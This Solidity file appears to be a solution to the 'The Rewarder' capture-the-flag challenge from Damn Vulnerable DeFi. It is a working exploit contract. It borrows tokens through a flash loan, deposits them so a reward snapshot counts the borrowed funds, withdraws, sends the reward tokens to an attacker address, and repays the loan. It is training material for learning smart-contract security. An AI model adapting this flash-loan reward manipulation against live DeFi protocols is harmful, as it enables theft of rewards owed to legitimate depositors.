// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract Borrower {
    FlashLoanerPool private immutable flashLoanerPool;
    TheRewarderPool private immutable rewarderPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;

    address payable attacker;

    //initialize FlashLoaner and Rewarder pools
    constructor(
        address _flashLoanerPool,
        address _rewarderPool,
        address _liquidityToken,
        address _rewardToken,
        address _attacker
    ) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
        attacker = payable(_attacker);
    }

    function borrow(uint256 _amount) external {
        flashLoanerPool.flashLoan(_amount);
    }

    //
    /**
     *
     * @param _amount : comes from flashLoan contract
     * @dev need to implement receiveFlashLoan()from FlashLoanerPool
     * 1. Upon receiving loan, deposit it to rewarder pool and withdraw right away
     */
    function receiveFlashLoan(uint256 _amount) public {
        liquidityToken.approve(address(rewarderPool), _amount); //approve amount to be transferred to rewarderPool
        rewarderPool.deposit(_amount); //deposit to rewarder pool
        //Call distributeRewards() to get rewards, take a quick snapshot and we will pass the checks because of our borrowed funds from flashLoans
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(_amount); //withdraw same amount
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this))); //transfer rewards to attacker
        liquidityToken.transfer(address(flashLoanerPool), _amount); //return loan to loanerPool
    }

    receive() external payable {}
}
